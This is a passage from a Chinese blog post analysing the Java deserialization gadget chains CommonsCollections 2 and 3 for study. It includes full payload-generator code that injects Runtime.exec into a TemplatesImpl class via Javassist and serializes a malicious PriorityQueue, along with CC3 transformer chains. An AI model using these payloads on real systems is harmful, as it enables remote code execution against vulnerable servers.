<p><strong>效果：</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211126223902264.png" alt="image-20211126223902264"></p>
<h4 id="TemplateImpl类及其利用链"><a href="#TemplateImpl类及其利用链" class="headerlink" title="TemplateImpl类及其利用链"></a>TemplateImpl类及其利用链</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>Javassist将Class加载成字节码，并对其执行方法进行修改（例如：插入恶意代码），接着我们将字节码传入A类的变量中。此处的A类能将该变量中的字节码实例化为对象，从而触发其中的static方法。</p>
<p>在CommonsCollections 2利用链中，<strong>TemplateImpl Class</strong>就是我们payload构造的起点。<strong>TemplateImpl Class</strong>中能将bytecodes变量用<strong>Classloader</strong> load并执行：</p>
<p>接下来，我们先来倒着分析一下：我们首先需要找到可以执行漏洞的地方。</p>
<h5 id="defineTransletClasses"><a href="#defineTransletClasses" class="headerlink" title="defineTransletClasses"></a>defineTransletClasses</h5><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211127154940678.png" alt="image-20211127154940678"></p>
<p>通过观察上图<code>defineTransletClasses()</code>中的内容，我们可以发现此处创建了一个新的<strong>TransletClassLoader instance</strong>，并返回到变量<strong>loader</strong>。因为最后一行要访问<code>_tfactory.getEcternalEctensionMap()</code>，所以如果我们需要call这个方法的话，需要设置<code>_tfactory</code>的值，因其为<strong>TransformerFactoryImpl</strong>类型，所以我们new一个就可以了，</p>
<h5 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h5><p>接着这下面又有一段代码</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211127214801875.png" alt="image-20211127214801875"></p>
<pre><code class="java">        Class defineClass(final byte[] b) &#123;
            return defineClass(null, b, 0, b.length);
        &#125;
</code></pre>
<p>在上图中，<code>loader.defineClass(_bytecodes[i]);</code>将字节码**_bytecodes<strong>传入</strong>loader** - 加载字符码。需要注意的是，我们的字节码的super class必须是AbstractTranslet类。</p>
<p>那么我们要如何才能<strong>触发defineTransletClasses -&gt; loader.defineClass呢？</strong></p>
<h5 id="getTransletInstance"><a href="#getTransletInstance" class="headerlink" title="getTransletInstance()"></a>getTransletInstance()</h5><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211127161222841.png" alt="image-20211127161222841">接着我们可以通过<code>getTranslateInstance()</code>来call到<code>defineTransletClasses()</code> - 当<code>_class</code>为空时，<code>defineTransletClasses()</code>会被执行。而之后 <code>.newInstance()</code>创建了instance，执行命令。但要想要执行到<code>newInstance()</code>,我们需要满足<code>_name != null</code></p>
<p>那么哪里又可以call到**getTransletInstance()**呢？</p>
<h5 id="newTransformer"><a href="#newTransformer" class="headerlink" title="newTransformer()"></a>newTransformer()</h5><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211127212356132.png" alt="image-20211127212356132"></p>
<h5 id="getOutputProperties"><a href="#getOutputProperties" class="headerlink" title="getOutputProperties()"></a>getOutputProperties()</h5><p>同样在<strong>TransformerImpl</strong>类的<code>getOutputProperties()</code>方法中发现newTransformer()被call了<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211127212511457.png" alt="image-20211127212511457"></p>
<h5 id="完整利用链"><a href="#完整利用链" class="headerlink" title="完整利用链"></a>完整利用链</h5><p>因此我们可以总结出，完整的利用链：</p>
<blockquote>
<p>TemplatesImpl.getOutputProperties()<br>TemplatesImpl.newTransformer()<br> TemplatesImpl.getTransletInstance()<br>     TemplatesImpl.defineTransletClasses()<br>         TransletClassLoader.defineClass()</p>
</blockquote>
<p><code>newTransformer()</code>也可作为利用链的开端</p>
<p>经过分析，我们只需要给<strong>TransletImpl</strong>类给以下的attributes赋值：</p>
<ul>
<li><strong>_bytecodes(恶意字节码)</strong></li>
<li><strong>_class(null)</strong></li>
<li><strong>_name(任意非空字符串)</strong></li>
<li><strong>_tfactory(new TransformerFactoryImpl())</strong></li>
</ul>
<p>同时，我们的字节码Class需要继承<strong>AbstractTranslet</strong>类</p>
<p>最后call <code>TemplatesImpl.getOutputProperties()</code>即可。</p>
<pre><code class="java">public class TempTest extends AbstractTranslet implements Serializable &#123;
    //必须继承AbstractTranslet
    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException, IllegalAccessException, InstantiationException, ClassNotFoundException, NoSuchFieldException, TransformerConfigurationException &#123;
        /*构造恶意代码，并使用javassist生成字节码*/
        ClassPool classPool = ClassPool.getDefault();//得到默认classPool
        final CtClass ctClass= classPool.get(TempTest.class.getName());//从ClassPool中获取属于TempTest的CtClass
        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;
        ctClass.makeClassInitializer().insertBefore(cmd);
        ctClass.setName(&quot;LeiheheTest&quot;);
        final byte[] classBytes = ctClass.toBytecode();

        /*创建TemplatesImpl对象*/
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        Class temp = Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;);//获取TemplatesImpl的Class类
        
        /*修改_name*/
        Field _name = temp.getDeclaredField(&quot;_name&quot;);
        _name.setAccessible(true);
        _name.set(templates,&quot;leihehe&quot;);
        
        /*修改_class*/
        Field _class = temp.getDeclaredField(&quot;_class&quot;);
        _class.setAccessible(true);
        _class.set(templates,null);

        /*修改_bytecodes*/
        Field _bytecodes = temp.getDeclaredField(&quot;_bytecodes&quot;);
        _bytecodes.setAccessible(true);
        _bytecodes.set(templates,new byte[][]&#123;classBytes&#125;);

        /*修改_tfactory*/
        Field _tfactory = temp.getDeclaredField(&quot;_tfactory&quot;);
        _tfactory.setAccessible(true);
        _tfactory.set(templates,new TransformerFactoryImpl());

        /*call利用链的第一条来触发漏洞*/
        templates.newTransformer();
        //templates.getOutputProperties(); //这条也可触发
    &#125;
</code></pre>
<p>结果：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211127215336783.png" alt="image-20211127215336783"></p>
<h3 id="CommonsCollections-2-利用链分析"><a href="#CommonsCollections-2-利用链分析" class="headerlink" title="CommonsCollections 2 利用链分析"></a>CommonsCollections 2 利用链分析</h3><p>经过上面的分析，我们已经知道了TemplateImpl类的利用链，只要我们找到能够call到利用链第一条<code>newTransfomer()</code>的地方，我们就可以找到反序列化点。</p>
<h4 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h4><p><code>TransformingComparator</code>的<code>compare</code> 方法可以触发transform()方法。</p>
<pre><code class="java">public int compare(I obj1, I obj2) &#123;
    O value1 = this.transformer.transform(obj1);
    O value2 = this.transformer.transform(obj2);
    return this.decorated.compare(value1, value2);
&#125;
</code></pre>
<p>看到这个transform()想起了什么？我们可以控制<code>transformer</code>的内容，然后执行<code>InvokerTransformer</code>的<code>transform()</code>方法。</p>
<h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p>在cc1里，我们就分析过<code>InvokerTransformer</code>，不妨再来回顾一遍，加深记忆。</p>
<pre><code class="java">public Object transform(Object input) &#123;
    if (input == null) &#123;
        return null;
    &#125; else &#123;
        try &#123;
            Class cls = input.getClass();//此处是关键
            Method method = cls.getMethod(this.iMethodName, this.iParamTypes);//此处是关键
            return method.invoke(input, this.iArgs);//此处是关键
        &#125; 
        ...//此处省略
&#125;
</code></pre>
<p><code>InvokerTransformer</code>中就有一个<code>transform()</code>的方法，如果传入的<code>input</code>不为空，那么我们就会依次获取<code>input</code>的Class类、<code>input</code>的某个method，并call我们获取到的方法。</p>
<p>那么在<code>InvokerTransformer</code>中，我们将<code>TemplateImpl</code>类的<code>object</code>作为<code>input</code>传进<code>transform()</code>方法里去就能成功触发了。</p>
<p>总结一下：我们可以通过 <code>TransformingComparator.compare()</code> 执行<code>InvokerTransformer</code>的<code>transform(我们的TemplateIml object)</code>，再执行<code>TemplateImpl</code>的<code>newTransformer()</code>方法</p>
<h4 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h4><p>利用链中用到了<code>PriorityQueue</code>来触发<code>TransformingComparator</code>.</p>
<p>因为我们传入的序列化对象就是PriorityQueue，所以我们先从readObject()开始分析。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211128194719960.png" alt="image-20211128194719960"></p>
<p>我们可以看到，queue中的元素会被反序列化，然后元素会被处理为二叉树类型 -&gt; **heapify()**。</p>
<h5 id="heapify"><a href="#heapify" class="headerlink" title="heapify()"></a>heapify()</h5><pre><code class="java">    private void heapify() &#123;
        for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)//无符号右移1位
            siftDown(i, (E) queue[i]);//将queue中的元素传入siftDown
    &#125;
</code></pre>
<p>该方法会寻找最后一个非叶子节点，然后使用siftDown方法。 需要注意的是，该处的size必须为2，因为当size为1时，<code>siftDown()</code>不会被call</p>
<h5 id="shiftDown"><a href="#shiftDown" class="headerlink" title="shiftDown"></a>shiftDown</h5><pre><code class="java">    private void siftDown(int k, E x) &#123;
        if (comparator != null)
            siftDownUsingComparator(k, x);
        else
            siftDownComparable(k, x);
    &#125;
</code></pre>
<p>该方法判断comparator是否为空，如果不为空，则进入<code>siftDownUsingComparator()</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211128195530245.png" alt="image-20211128195530245"></p>
<p>注意x为queue中的元素，如果我们将<strong>comparator</strong>设为<strong>TransformingComparator</strong>，就可以连上之前的链了 - queue中的元素会作为<code>InvokerTransformer</code>的<code>input object</code>！</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211202153617378.png" alt="image-20211202153617378"></p>
<p>再次总结一下：</p>
<ul>
<li>将<strong>comparator</strong>设为<strong>TransformingComparator</strong></li>
<li>在queue中加入两个元素，其中第一个元素为我们构造的<strong>templates</strong></li>
</ul>
<h3 id="Payload构造-1"><a href="#Payload构造-1" class="headerlink" title="Payload构造"></a>Payload构造</h3><pre><code class="java">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CommonsCollections2 &#123;
    public static void main(String[] args) throws Exception &#123;

        /* 生成字节码 */
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath((AbstractTranslet.class)));
        CtClass cc = classPool.makeClass(&quot;Evil&quot;);
        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;
        cc.makeClassInitializer().insertBefore(cmd);//通过CtClass.makeClassInitializer方法在当前类创建了一个静态代码块
        cc.setName(&quot;Leihehe&quot;);
        cc.setSuperclass(classPool.get(AbstractTranslet.class.getName()));//必须要继承AbstractTranslet类
        final byte[] classBytes = cc.toBytecode();//获取字节码


        /* TemplatesImpl加载字节码 */
        TemplatesImpl templates = TemplatesImpl.class.newInstance();//创建一个templates对象
        setFieldValue(templates,&quot;_name&quot;,&quot;leihehe&quot;);
        setFieldValue(templates,&quot;_class&quot;,null);
        setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;classBytes&#125;);
        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());

        /* 创建InvokerTransformer */
        final InvokerTransformer transformer = new InvokerTransformer(&quot;toString&quot;, new Class[0], new Object[0]);
        // toString是为了保证在构造反序列化链的过程中不报错，只是起到占位的作用。

        /* 创建TransformingComparator */
        TransformingComparator comparator = new TransformingComparator(transformer);

        /* 创建PriorityQueue */
        final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;&gt;(2,comparator);
        //priorityQueue -&gt; TransformingComparator.compare -&gt; InvokerTransformer.transform
        queue.add(templates);//add elements
        queue.add(new String(&quot;n&quot;));
        setFieldValue(transformer,&quot;iMethodName&quot;,&quot;newTransformer&quot;);//需要在最后一步修改，否则出错

        /* 写出序列化文件 */
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream((&quot;test.ser&quot;)));
        outputStream.writeObject(queue);
        outputStream.close();
    &#125;
    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception &#123;
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    &#125;

    public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) &#123;
        Field field = null;
        try &#123;
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        &#125;
        catch (NoSuchFieldException ex) &#123;
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        &#125;
        return field;
    &#125;
&#125;
</code></pre>
<p>上述代码中，我们将反射方法写在两个method  - <code>setFieldValue()</code>和<code>getField()</code>中，方便使用。</p>
<h3 id="几个问题"><a href="#几个问题" class="headerlink" title="几个问题"></a>几个问题</h3><ol>
<li><p><strong>为什么在创建<code>InvokerTransformer</code>的时候，不直接通过constructor定义<code>iMethodName</code>为<code>newTransformer</code>？</strong></p>
<p>刚开始我也没搞明白，后来试了试，发现如果在创建<code>InvokerTransformer</code>的时候就修改method名字的话，在执行到<code>queue.add(1)</code>时会报错，如下图</p>
<pre><code class="java">        final InvokerTransformer transformer = new InvokerTransformer(&quot;newTransformer&quot;, new Class[0], new Object[0]);//不能像这样直接定义method名字
</code></pre>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211128234002277.png" alt="image-20211128234002277"></p>
</li>
</ol>
<p>进入**queue.add()**后：</p>
<pre><code class="java">    public boolean add(E e) &#123;
        return offer(e);//进入offer()
    &#125;

    public boolean offer(E e) &#123;
        if (e == null)
            throw new NullPointerException();
        modCount++;
        int i = size;
        if (i &gt;= queue.length)
            grow(i + 1);
        size = i + 1;
        if (i == 0)
            queue[0] = e;
        else
            siftUp(i, e);//进入siftUp
        return true;
    &#125;

    private void siftUp(int k, E x) &#123;
        if (comparator != null)
            siftUpUsingComparator(k, x);//重点！
        else
            siftUpComparable(k, x);
    &#125;

    private void siftUpUsingComparator(int k, E x) &#123;
        while (k &gt; 0) &#123;
            int parent = (k - 1) &gt;&gt;&gt; 1;
            Object e = queue[parent];
            if (comparator.compare(x, (E) e) &gt;= 0)//这里也会call compare，但是我们传过去的第二个元素并没有newTransformer方法，所以在生成payload的时候就会出错，所以我们需要把修改method放在queue.add()后面
                break;
            queue[k] = e;
            k = parent;
        &#125;
        queue[k] = x;
    &#125;
</code></pre>
<ol start="2">
<li><strong>为什么要add(new String(“n”))而不是add(1)?</strong></li>
</ol>
<p>通过跟踪服务端触发过程可以发现，<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211129123207018.png" alt="image-20211129123207018">最先触发的总是队列中的第一个元素，如果第一个元素变成了1而不是<strong>templatesIml</strong>的话，我们就无法找到元素1当中的<strong>newTransformer</strong>方法，这时候会报错并抛出异常，无法执行到我们的恶意代码；但如果第一个元素是<strong>templatesIml</strong>的话，我们就可以执行到<strong>newTrasnformer</strong>方法。</p>
<p>同样，如果我们在payload中向queue中添加1而不是一个String类型，添加完毕后，queue会自动排序，将1排序到最前面，导致最后在server反序列化的时候会出错（如上方解释）。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/2.gif" alt="2"></p>
<p><strong>所以我们有两种方式来写这个payload，一种是我之前代码演示的那样。</strong></p>
<p><strong>第二种：也是ysoserial中使用的方法</strong></p>
<pre><code class="java"> //...
 queue.add(1);
 queue.add(1);//先直接添加两个元素到queue里
 
 setFieldValue(transformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);//修改方法名

 // 最后使用反射的方式，修改queue中的元素，这样就不会遇到在add的时候被自动排列的情况了
 final Object[] queueArray = (Object[])getFieldValue(queue, &quot;queue&quot;);
 queueArray[0] = templates;
 queueArray[1] = 1;
 //...

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception &#123;
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    &#125;
 //...
</code></pre>
<p>执行成功！</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211129124841260.png" alt="image-20211129124841260"></p>
<h3 id="Reference-1"><a href="#Reference-1" class="headerlink" title="Reference"></a>Reference</h3><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/232592">ysoserial CommonsCollections2 详细分析</a></p>
<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6988477390276001829">JAVA双亲委派</a></p>
<p><a target="_blank" rel="noopener" href="http://wjlshare.com/archives/1509">Java反序列化-CommonsCollections2分析</a></p>
<h2 id="Commons-Collections-3"><a href="#Commons-Collections-3" class="headerlink" title="Commons Collections 3"></a>Commons Collections 3</h2><h3 id="环境搭建-2"><a href="#环境搭建-2" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
<li><p>commons-collections:3.1</p>
</li>
<li><p>jdk7u21之前</p>
</li>
</ul>
<h3 id="复现演示-1"><a href="#复现演示-1" class="headerlink" title="复现演示"></a>复现演示</h3><p>依然是使用ysoserial生成，然后curl命令执行，和之前的cc1和cc2一样，此处就不演示了。</p>
<h3 id="Commons-Collections-3-利用链分析"><a href="#Commons-Collections-3-利用链分析" class="headerlink" title="Commons Collections 3 利用链分析"></a>Commons Collections 3 利用链分析</h3><h4 id="TemplatesImpl-amp-javassist"><a href="#TemplatesImpl-amp-javassist" class="headerlink" title="TemplatesImpl &amp; javassist"></a>TemplatesImpl &amp; javassist</h4><p>同cc2一样，我们需要用<code>javassist</code>生成带命令执行的<strong>字节码</strong>，然后用<code>TemplatesImpl</code>将其加载到JVM。</p>
<h4 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h4><p>在cc2中，InvokerTransformer的transform方法能够帮我们执行<code>TemplatesImpl</code>类的<code>newTransformer()</code>方法，而在cc3中，我们找到了另一个class - <strong>TrAXFilter</strong></p>
<pre><code class="java">    public TrAXFilter(Templates templates)  throws
        TransformerConfigurationException
    &#123;
        _templates = templates;
        _transformer = (TransformerImpl) templates.newTransformer();//直接call到newTransformer方法
        _transformerHandler = new TransformerHandlerImpl(_transformer);
        _useServicesMechanism = _transformer.useServicesMechnism();
    &#125;
</code></pre>
<p>我们发现，TrAXFilter的构造器会直接call到<code>TransformerImpl</code>的<code>newTransformer()</code>方法，恰好<strong>TemplatesImpl</strong>和<strong>TransformerImpl</strong>都是继承<strong>Templates</strong>的。如果我们把<code>_templates</code>设置为我们自己构造的<code>TemplatesImpl instance</code>，命令就能被执行了。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211130200257918.png" alt="image-20211130200257918"></p>
<p>因为我们的触发点是在<code>new TrAXFilter</code>的时候，<strong>所以我们需要在server反序列化我们的object的时候再执行这段代码，而不是我们自己在本地这样随便new一个就可以了。</strong></p>
<p>那么哪个类能够帮助我们new一个新的TrAXFilter呢？</p>
<h4 id="方法一：InvokerTransformer"><a href="#方法一：InvokerTransformer" class="headerlink" title="方法一：InvokerTransformer"></a>方法一：InvokerTransformer</h4><p><code>CommonsCollections 3.1</code>支持我们继续使用<code>InvokerTransformer</code></p>
<p>于是我们想到可以用<code>InvokerTransformer</code>来new一个新的<code>TrAXFilter</code>，下面我们先用反射的方式来写一下</p>
<pre><code class="java">Class trAXFilterClass = Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;);//获取Class
//Class trAXFilterClass = TrAXFilter.class//也可以直接这样，因为我们加载过该Class
trAXFilterClass.getConstructor(TemplatesImpl.class).newInstance();//获取constructor后再call newInstance
</code></pre>
<p>我们尝试把上面的反射代码改写成InvokerTransformer</p>
<pre><code class="java">InvokerTransformer i1 = new InvokerTransformer(&quot;getConstructor&quot;,new Class[]&#123;Class[].class&#125;,new Object[]&#123;new Class[]&#123;Templates.class&#125;&#125;);//先构造transformer的参数
Constructor constructor = i1.transform(TrAXFilter.class);//call transform方法，返回一个constructor -&gt; constructor = TrAXFilter.class.getConstructor()
InvokerTransformer i2 = new InvokerTransformer(&quot;newInstance&quot;, new Class[]&#123;Object[].class&#125;,new Object[] &#123;new Object[]&#123;templates&#125;&#125;);
i2.transform(constructor);//constructor.newInstance()
</code></pre>
<p>在这里我们可以直接构造<code>InvokerTransformer</code>，并在constructor传入方法参数 - 不像在cc2里，我们需要在<code>PriorityQueue.add()</code>之后修改 - 因为<code>PriorityQueue.add()</code>会在<strong>add</strong>的时候触发<code>comparator</code>从而<code>InvokerTransformer</code>的<code>transform()</code>方法，但在这里不会出现这种情况。</p>
<p>运行后成功弹出计算器。 </p>
<h4 id="方法二：InstantiateTransformer"><a href="#方法二：InstantiateTransformer" class="headerlink" title="方法二：InstantiateTransformer"></a>方法二：InstantiateTransformer</h4><p>除了使用<code>InvokerTransformer</code>来创建<code>TrAXFilter</code> instance，我们还可以通过一个新的Class <code>InstantiateTransformer</code>来完成。</p>
<p><code>InstantiateTransformer</code>的<code>transform()</code>方法中，有一处很明显的创建实例的代码。而它也是属于<code>Transformer</code>的实现类。使用该类，我们不再需要构造getConstructor这样的函数，因为他已经帮我做了，我们只需要传入<code>input</code>。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211201110012791.png" alt="image-20211201110012791"></p>
<p>我们现在尝试使用InstantiateTransformer来写一段POC：</p>
<pre><code class="java">        InstantiateTransformer initiateTransformer= new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;);
//传入参数类型是Templates Class，传入arguements为templates
        initiateTransformer.transform(TrAXFilter.class);//传入input为TrAxFilter.class
</code></pre>
<p>计算器成功弹出！</p>
<h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p>我们在cc1中使用到了这个方法，它让我们可以将几条transformer串联起来，并用上一个<code>transfomer.transform(intput)</code>的返回值作为<strong>下一个</strong><code>transfomer.transform(input)</code>中的<strong>input</strong>进行执行。</p>
<p>这里我们再简单的复习一遍</p>
<pre><code class="java">    public ChainedTransformer(Transformer[] transformers) &#123;//我们可以构造transformers
        this.iTransformers = transformers;
    &#125;

    public Object transform(Object object) &#123;
        for(int i = 0; i &lt; this.iTransformers.length; ++i) &#123;//依次循环每个transformer,当前transformer.transform(object)的返回值会直接变成下一个transformer.trnasform(object)中的object
            object = this.iTransformers[i].transform(object);
        &#125;

        return object;
    &#125;
</code></pre>
<p>但是，我们还差一个开头的transformer。 <code>TrAXFilter.getConstructor.newInstance()</code>中的<code>TrAXFilter</code>类，我们需要想办法让他也能用<code>ChainedTransformer</code>连接起来，而不是手动去用<code>.transform(input)</code>作为<code>input</code>传入进去。</p>
<p><strong>方法一：</strong></p>
<pre><code class="java">Transformer[] transformers = new Transformer[]&#123;
    /* 这里需要添加一个transformer，让他能够返回TrAXFilter class，作为下一个transformer的input */
    new InvokerTransformer(&quot;getConstructor&quot;,new Class[]&#123;Class[].class&#125;,new Object[]&#123;new Class[]&#123;Templates.class&#125;&#125;),
    new InvokerTransformer(&quot;newInstance&quot;, new Class[]&#123;Object[].class&#125;,new Object[] &#123;new Object[]&#123;templates&#125;&#125;)
&#125;;

ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
</code></pre>
<p><strong>方法二：</strong></p>
<pre><code class="java">Transformer[] transformers = new Transformer[]&#123;
    /* 这里需要添加一个transformer，让他能够返回TrAXFilter class，作为下一个transformer的input */
    new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;)
&#125;;

ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
</code></pre>
<h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p>我们最终选择使用我们在cc1中用到的<code>ConstantTransformer</code></p>
<pre><code class="java">    public ConstantTransformer(Object constantToReturn) &#123;
        this.iConstant = constantToReturn;
    &#125;

    public Object transform(Object input) &#123;
        return this.iConstant;
    &#125;
</code></pre>
<p>通过这个类，我们可以将<code>TrAXFilter</code>类传进去，作为<code>transformers</code>的开头，这样我们的链就串上了！</p>
<p><strong>方法一：</strong></p>
<pre><code class="java">Transformer[] transformers = new Transformer[]&#123;
new ConstantTransformer(trAXFilterClass),
new InvokerTransformer(&quot;getConstructor&quot;,new Class[]&#123;Class[].class&#125;,new Object[]&#123;new Class[]&#123;Templates.class&#125;&#125;),
new InvokerTransformer(&quot;newInstance&quot;, new Class[]&#123;Object[].class&#125;,new Object[] &#123;new Object[]&#123;templates&#125;&#125;)
&#125;;
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
chainedTransformer.transform(&quot;1&quot;);//触发第一条ConstantTransformer，传入参数随便写，不影响，因为ConstantTrnasformer的transform函数不会用到它自己的input参数
</code></pre>
<p><strong>方法二：</strong></p>
<pre><code class="java">Transformer[] transformers = new Transformer[]&#123;
new ConstantTransformer(TrAXFilter.class),
new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;)
&#125;;
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
chainedTransformer.transform(&quot;1&quot;);//触发第一条ConstantTransformer，传入参数随便写，不影响，因为ConstantTrnasformer的transform函数不会用到它自己的input参数
</code></pre>
<p>计算器执行成功。</p>
<h4 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h4><p><span id="lazyMap">ps：CC1的LazyMap及之后的部分也和这个一样。</span></p>
<p>接下来我们需要寻找触发<code>ChainedTrasnformer.transform()</code>的方法。在CC1链中，我们用到了<code>LazyMap.get()</code>，其中invoke了<code>transform()</code>方法。当我们把<code>factory</code>赋值为<code>chainedTransformer</code>就可以触发其<code>transform()</code>方法了。</p>
<pre><code class="java">    public Object get(Object key) &#123;
        if (!super.map.containsKey(key)) &#123;
            Object value = this.factory.transform(key);
            super.map.put(key, value);
            return value;
        &#125; else &#123;
            return super.map.get(key);
        &#125;
    &#125;
</code></pre>
<p>但因为<code>LazyMap</code>的constructor是protected的，所以我们不能直接构造，我们发现LazyMap的decorate()方法可以返回一个instance：</p>
<pre><code class="java">public static Map decorate(Map map, Transformer factory) &#123;
    return new LazyMap(map, factory);
&#125;
</code></pre>
<p>所以我们可以这样写：</p>
<pre><code class="java">        Map map = new HashMap();
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(map,chainedTransformer);//得到lazyMap instance
</code></pre>
<p>那么怎样触发LazyMap.get()方法呢？最好是readObject内部可以用到的。</p>
<h4 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h4><p>我们发现在<code>AnnotationInvocationHandler</code>中的<code>invoke()</code>调用了<code>memberValues.get(member)</code></p>
<pre><code class="java">    public Object invoke(Object proxy, Method method, Object[] args) &#123;
        String member = method.getName();
        Class&lt;?&gt;[] paramTypes = method.getParameterTypes();

        // Handle Object and Annotation methods
        if (member.equals(&quot;equals&quot;) &amp;&amp; paramTypes.length == 1 &amp;&amp;
            paramTypes[0] == Object.class)
            return equalsImpl(args[0]);
        assert paramTypes.length == 0;
        if (member.equals(&quot;toString&quot;))
            return toStringImpl();
        if (member.equals(&quot;hashCode&quot;))
            return hashCodeImpl();
        if (member.equals(&quot;annotationType&quot;))
            return type;

        // Handle annotation member accessors
        Object result = memberValues.get(member);//这里调用了get()

        if (result == null)
            throw new IncompleteAnnotationException(type, member);

        if (result instanceof ExceptionProxy)
            throw ((ExceptionProxy) result).generateException();

        if (result.getClass().isArray() &amp;&amp; Array.getLength(result) != 0)
            result = cloneArray(result);

        return result;
    &#125;
</code></pre>
<p>如果我们把memberValues的值改为Lazymap对象，那么我们就可以触发漏洞了。</p>
<p>我们可以通过AnnotationInvocationHandler的构造函数来达到这个目的。</p>
<pre><code class="java">    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123;
        this.type = type;
        this.memberValues = memberValues;
    &#125;
</code></pre>
<p>但尝试后发现并不能直接创建对象</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E9%9B%86%E5%90%88-4/image-20211201153006916.png" alt="image-20211201153006916"> </p>
<p>因为AnnotationInvocationHandler无法直接访问，于是我们使用反射方法</p>
<pre><code class="java">String classToSerialize = &quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;;
final Constructor&lt;?&gt; constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
constructor.setAccessible(true);
InvocationHandler secondInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);//AnnotationInvocationHandler是实现InvocationHandler类的，我们可以直接把他转化为InvocationHandler类，传入我们的lazyMap
</code></pre>
<p>但我们应该如何call到<code>secondInvocationHandler</code>的<code>invoke()</code>方法呢?</p>
